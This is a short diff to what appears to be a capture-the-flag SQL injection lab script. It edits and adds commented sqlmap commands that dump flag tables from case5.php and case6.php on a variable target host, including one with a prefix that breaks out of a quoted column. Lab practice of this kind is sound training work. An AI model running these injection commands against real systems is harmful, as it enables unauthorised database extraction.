@@ -46,10 +46,11 @@
 #
 ###case 5
 #
-#sqlmap -u "http://TGTHOST/case5.php?id=*" --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
+#sqlmap -u "http://$TGTHOST/case5.php?id=*" --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
 #
 ###case 6
 #
+#sqlmap -u "http://$TGTHOST/case6.php?col=id" --dump --batch -t flag6 --random-agent --level 5 --risk 3 --dbms=MySQL --method=GET -v 3 --prefix="\`)"
 ###case 7
 #
 ###case 8
